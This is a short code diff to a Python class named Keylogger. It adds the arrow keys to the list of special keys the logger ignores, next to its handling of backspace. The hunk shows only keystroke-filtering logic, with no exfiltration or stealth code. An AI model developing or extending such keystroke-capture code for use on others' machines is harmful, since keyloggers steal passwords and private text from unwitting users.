@@ -33,6 +33,10 @@ class Keylogger:
                                     "Key.shift_r",
                                     "Key.ctrl",
                                     "Key.escape",
+                                    "Key.up",
+                                    "Key.down",
+                                    "Key.left",
+                                    "Key.right"
                                     ):
                                 pass
                             elif i == "Key.backspace":
